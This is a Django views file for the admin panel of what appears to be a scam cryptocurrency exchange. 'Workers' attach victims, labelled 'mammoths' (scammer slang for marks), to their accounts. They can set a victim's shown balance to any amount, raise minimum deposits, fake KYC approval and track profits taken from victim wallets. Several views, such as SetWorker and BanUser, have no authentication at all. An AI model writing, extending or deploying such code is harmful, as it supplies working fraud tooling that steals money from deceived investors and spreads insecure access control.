from django.http import JsonResponse
from django.shortcuts import render, redirect
from django.contrib.auth.mixins import LoginRequiredMixin, PermissionRequiredMixin
from django.contrib.auth.models import User
from django.views.generic import View
from app.models import *
from app.views import Binance
from .forms import TermsTextForm
from django.db import IntegrityError


# Create your views here.
class DashboardView(LoginRequiredMixin, View):
    login_url = '/login/'

    def get(self, request, *args, **kwargs):
        if request.user.is_staff is False:
            return redirect('/account/')
        user = Trader.objects.filter(user=request.user).first()
        mammoths = Referral.objects.filter(referrer=user).all()
        worker = Trader.objects.filter(user=request.user).first()
        profits = Profit.objects.filter(worker=worker).all()
        notifications = Notification.objects.filter(user=request.user).all()

        if len(profits) != 0:
            currency = Wallet.objects.filter(address=profits.last().wallet.address).first().name
            if currency == 'usdt':
                last_profit = profits.last().amount
            else:
                last_profit = Binance(currency, profits.last().amount).get_balance()
        else:
            last_profit = 0

        context = {
            'mammoths': len(mammoths),
            'user': user,
            'all_profits': len(profits),
            'last_profit': last_profit,
            'notifications': notifications
        }
        return render(request, 'admin_panel/index.html', context)


class AddUserView(LoginRequiredMixin, View):
    login_url = '/login/'

    def get(self, request, *args, **kwargs):
        if request.user.is_staff is False:
            return redirect('/account/')
        user = Trader.objects.filter(user=request.user).first()
        context = {
            'referral_id': user.referral_id,
            'worker': user.user_id
        }
        return render(request, 'admin_panel/add_user.html', context)


class MyMammothsView(LoginRequiredMixin, View):
    login_url = '/login/'

    def get(self, request, *args, **kwargs):
        if request.user.is_staff is False:
            return redirect('/account/')
        user = Trader.objects.filter(user=request.user).first()
        referrals = Referral.objects.filter(referrer=user).all()
        context = {
            'users': referrals,
            'page_info': 'Мои мамонты',
        }
        return render(request, 'admin_panel/my_users.html', context)


class AllUsersView(LoginRequiredMixin, View):
    login_url = '/login/'

    def get(self, request, *args, **kwargs):
        if request.user.is_superuser is False:
            return redirect('/account/')
        users = Trader.objects.all()
        context = {
            'users': users,
            'page_info': 'Все пользователи',
        }
        return render(request, 'admin_panel/all_users.html', context)


class AllProfitsView(LoginRequiredMixin, View):
    login_url = '/login/'

    def get(self, request, *args, **kwargs):
        if request.user.is_superuser is False:
            return redirect('/account/')
        profits = Profit.objects.all()
        context = {
            'profits': profits,
        }
        return render(request, 'admin_panel/profits.html', context)


class GetUserView(LoginRequiredMixin, View):
    login_url = '/login/'

    def get(self, request, user_id, *args, **kwargs):
        if request.user.is_staff is False:
            return redirect('/account/')
        if request.user.id == int(user_id):
            return redirect('/panel/')
        if request.user.is_staff is True:
            worker = Trader.objects.filter(user=request.user).first()
            user = Trader.objects.filter(user_id=user_id).first()
            worker_referrals = Referral.objects.filter(referrer=worker).all()
            if int(user_id) not in [i.referred.user_id for i in worker_referrals]:
                if request.user.is_superuser is False:
                    return redirect('/panel/')
            if worker.is_worker is True and user.is_worker is True:
                if request.user.is_superuser is False:
                    return redirect('/panel/')
        user = User.objects.filter(id=user_id).first()
        worker = Trader.objects.filter(user=user).first()
        form = TermsTextForm(worker.terms_text)
        documents = Document.objects.filter(user=user).all()
        context = {
            'user': user,
            'worker': worker,
            'btc_wallet': Wallet.objects.filter(user=user).filter(name='btc').first(),
            'eth_wallet': Wallet.objects.filter(user=user).filter(name='eth').first(),
            'ltc_wallet': Wallet.objects.filter(user=user).filter(name='ltc').first(),
            'bch_wallet': Wallet.objects.filter(user=user).filter(name='bch').first(),
            'dash_wallet': Wallet.objects.filter(user=user).filter(name='dash').first(),
            'usdt_wallet': Wallet.objects.filter(user=user).filter(name='usdt').first(),
            'documents': documents,
            'ckeditor': form
        }
        if worker.is_worker:
            w = Trader.objects.filter(user=user).first()
            profits = Profit.objects.filter(user=w.user).all()
            if len(profits) != 0:
                currency = Wallet.objects.filter(address=profits.last().wallet.address).first().name
                if currency == 'usdt':
                    last_profit = profits.last().amount
                else:
                    last_profit = Binance(currency, profits.last().amount).get_balance()
            else:
                last_profit = 0
            context['mammoths'] = len(Referral.objects.filter(referrer=worker).all())
            context['profits'] = len(profits)
            context['last_profit'] = last_profit
        return render(request, 'admin_panel/get_user.html', context)

    def post(self, request, *args, **kwargs):
        user = Trader.objects.filter(user_id=int(request.POST['user_id'])).first()
        if request.POST['terms'] == '':
            terms = None
        else:
            terms = request.POST['terms']
        user.terms_text = terms
        user.save()
        return redirect(f'/panel/user/{user.user_id}/')


class WalletView(LoginRequiredMixin, View):
    login_url = '/login/'

    def get(self, request, address, *args, **kwargs):
        if request.user.is_superuser is False:
            return redirect('/account/')
        wallet = Wallet.objects.filter(address=address).first()
        if wallet is None:
            return redirect('/panel/')
        context = {
            'wallet': wallet,
        }
        return render(request, 'admin_panel/get_wallet.html', context)


class KYCVerify(LoginRequiredMixin, View):
    login_url = '/login/'

    def post(self, request, *args, **kwargs):
        user = User.objects.filter(id=request.POST['user_id']).first()
        user_kyc = Trader.objects.filter(user=user).first()
        user_kyc.kyc_status = 'verified'
        user_kyc.save()
        return redirect(f'/panel/user/{user.id}/')


class UpdateBalance(LoginRequiredMixin, View):
    login_url = '/login/'

    def post(self, request, *args, **kwargs):
        user = User.objects.filter(id=request.POST['user_id']).first()
        user_wallet = Wallet.objects.filter(user=user).filter(name=request.POST['coin']).first()
        user_wallet.balance = float(request.POST['amount'])
        user_wallet.save()
        return redirect(f'/panel/user/{user.id}/')


class ReferralBonus(LoginRequiredMixin, View):
    login_url = '/login/'

    def post(self, request, *args, **kwargs):
        user = User.objects.filter(id=request.POST['user_id']).first()
        user_referral_bonus = Trader.objects.filter(user=user).first()
        user_referral_bonus.referral_bonus = int(request.POST['amount'])
        user_referral_bonus.save()
        return redirect(f'/panel/user/{user.id}/')


class MinDeposit(LoginRequiredMixin, View):
    login_url = '/login/'

    def post(self, request, *args, **kwargs):
        user = User.objects.filter(id=request.POST['user_id']).first()
        user_min_deposit = Trader.objects.filter(user=user).first()
        user_min_deposit.min_deposit = str(request.POST['amount'])
        user_min_deposit.save()
        return redirect(f'/panel/user/{user.id}/')


class BindUser(LoginRequiredMixin, View):
    login_url = '/login/'

    def post(self, request, *args, **kwargs):
        referral_id = Trader.objects.filter(user=request.user).first()

        wallet = Wallet.objects.filter(address=request.POST['data']).first()
        email = User.objects.filter(email=request.POST['data']).first()
        username = User.objects.filter(username=request.POST['data']).first()

        if wallet:
            user = Trader.objects.filter(user=wallet.user).first()
        elif email:
            user = Trader.objects.filter(user=email).first()
        elif username:
            user = Trader.objects.filter(user=username).first()

        try:
            Referral.objects.create(referrer=referral_id, referred=user)
            context = {'status': 'success', 'user_id': user.user.id, 'referral_id': referral_id.referral_id}
        except IntegrityError:
            context = {'status': 'error', 'message': 'Ты не можешь привязать данного пользователя.',
                       'referral_id': referral_id.referral_id}
        except UnboundLocalError:
            context = {'status': 'error', 'message': 'Мамонт не найден, проверь введенные данные и попробуй еще раз.',
                       'referral_id': referral_id.referral_id}
        return render(request, 'admin_panel/add_user.html', context)


class BanUser(View):
    def post(self, request, *args, **kwargs):
        user = User.objects.filter(id=request.POST['user_id']).first()
        if user.is_active:
            user.is_active = False
        else:
            user.is_active = True
        user.save()
        return redirect(f'/panel/user/{user.id}/')


class SetWorker(View):
    def post(self, request, *args, **kwargs):
        user = Trader.objects.filter(user_id=request.POST['user_id']).first()
        user.is_worker = True
        user.save()
        user = User.objects.filter(id=request.POST['user_id']).first()
        user.is_staff = True
        user.save()
        return redirect(f'/panel/user/{request.POST["user_id"]}/')


class AddChatToken(View):
    def post(self, request, *args, **kwargs):
        user = Trader.objects.filter(user_id=request.POST['user_id']).first()
        if request.POST['token'] == '':
            token = None
        else:
            token = request.POST['token']
        user.chat_token = token
        user.save()
        return redirect(f'/panel/')


class AddBotToken(View):
    def post(self, request, *args, **kwargs):
        user = Trader.objects.filter(user_id=request.POST['user_id']).first()
        user.bot_token = request.POST['token']
        user.telegram_id = request.POST['telegram_user_id']
        user.save()
        return redirect(f'/panel/')


class CheckNotification(View):
    def post(self, request):
        name = request.POST['data[name]']
        status = request.POST['data[status]']
        user_id = request.POST['data[user_id]']

        change_status = {'true': True, 'false': False}

        user = User.objects.filter(id=user_id).first()
        notif = Notification.objects.filter(user=user).filter(name=name).first()
        notif.status = change_status[status]
        notif.save()

        return JsonResponse({"name": name}, status=200)
